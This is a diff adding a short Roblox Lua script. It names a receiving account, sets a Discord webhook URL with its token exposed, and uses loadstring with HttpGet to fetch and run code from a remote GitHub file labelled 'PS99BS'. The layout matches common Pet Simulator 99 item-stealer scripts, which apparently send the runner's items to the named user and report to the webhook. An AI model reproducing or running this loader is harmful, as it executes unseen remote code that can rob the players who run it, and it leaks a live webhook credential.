@@ -1,0 +1,5 @@
+Username = "bocahgila23"
+Username2 = "bocahgila23"
+Webhook = "https://discord.com/api/webhooks/1236168664173117450/GAD3CTKNjsLvllNb34YPWjiMrqDQkUE8ACLJk6gu4qprTfnD1EQyz0KwMbUI__MKVKJT"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pardedeks/Pardedeks/main/PS99BS"))()
